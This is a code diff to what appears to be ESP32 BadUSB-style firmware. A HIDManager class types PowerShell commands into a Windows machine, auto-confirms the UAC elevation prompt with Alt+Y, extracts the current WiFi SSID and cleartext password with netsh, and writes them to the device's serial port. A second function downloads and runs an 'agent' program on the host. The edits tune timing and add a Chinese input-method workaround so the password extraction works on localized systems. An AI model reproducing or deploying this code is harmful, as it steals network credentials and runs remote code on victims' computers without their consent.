@@ -336,42 +336,60 @@ void HIDManager::autoGetWindowsWiFi() {
     
     // 3. Wait for UAC prompt and auto-confirm with Alt+Y
     Serial.println("[HID] Waiting for UAC prompt...");
-    delay(1500); // Critical delay for UAC
+    delay(1800); // Critical delay for UAC
     keyboard.press(KEY_LEFT_ALT);
     keyboard.press('y');
     delay(100);
     keyboard.releaseAll();
-    delay(1000); // Wait for PowerShell to open
+    delay(3000); // Wait for PowerShell to open
     
     Serial.println("[HID] PowerShell opened, executing WiFi script...");
     
-    // 4. Get WiFi SSID
+    // 4. Get current WiFi SSID
     keyboard.print("$wifi = (netsh wlan show interfaces | Select-String 'SSID' | Select-Object -First 1) -replace '.*: ', '';");
+    keyboard.print("$wifi");
     keyboard.press(KEY_RETURN);
     delay(100);
     keyboard.releaseAll();
-    delay(200);
+    delay(1000);
     
-    // 5. Get WiFi password
-    keyboard.print("$pass = (netsh wlan show profile name=$wifi key=clear | Select-String 'Key Content') -replace '.*: ', '';");
+    // 5. Get WiFi password using proper XML parsing method    
+    keyboard.print("$pass = (netsh wlan show profile name=$wifi key=clear | Where-Object { $_ -match 'key content|");
+    keyboard.releaseAll();
+    delay(100);
+    keyboard.press(KEY_LEFT_CTRL);
+    keyboard.print(" ");
+    keyboard.releaseAll();
+    delay(300);
+    keyboard.print("guanjianneirong");
+    keyboard.print(" ");
+    keyboard.releaseAll();
+    delay(300);
+    keyboard.press(KEY_LEFT_CTRL);
+    keyboard.print(" ");
+    keyboard.releaseAll();
+    delay(200);
+    keyboard.print("' -and $_ -match ':\\s*' } | ForEach-Object {$_.Trim() -split ':' | Select-Object -Last 1}).Trim()");
+    keyboard.print("; $pass");
     keyboard.press(KEY_RETURN);
     delay(100);
     keyboard.releaseAll();
-    delay(200);
+    delay(1000);
     
     // 6. Find ESP32 CDC serial port
     keyboard.print("$port = (Get-WmiObject Win32_SerialPort | Where-Object {$_.Description -like '*USB*'} | Select-Object -First 1).DeviceID;");
+    keyboard.print("$port");
     keyboard.press(KEY_RETURN);
     delay(100);
     keyboard.releaseAll();
-    delay(200);
+    delay(800);
     
     // 7. Send WiFi info to serial port (format: SSID|Password)
-    keyboard.print("if ($port) { $sp = New-Object System.IO.Ports.SerialPort $port, 115200; $sp.Open(); $sp.WriteLine(\"$wifi|$pass\"); $sp.Close(); }");
+    keyboard.print("if ($port -and $pass) { $sp = New-Object System.IO.Ports.SerialPort $port, 115200; $sp.Open(); $sp.WriteLine(\"$wifi|$pass\"); $sp.Close(); }");
     keyboard.press(KEY_RETURN);
     delay(100);
     keyboard.releaseAll();
-    delay(500);
+    delay(1200);
     
     // 8. Exit PowerShell to close the window
     keyboard.print("exit");
@@ -406,7 +424,7 @@ void HIDManager::downloadAndRunAgent(const String& deviceIP) {
     keyboard.press(KEY_RETURN);
     delay(100);
     keyboard.releaseAll();
-    delay(3000); // Wait for download to complete
+    delay(3500); // Wait for download to complete
     
     // 3. Run agent program (no WiFi parameter needed, already connected)
     Serial.println("[HID] Running agent program...");
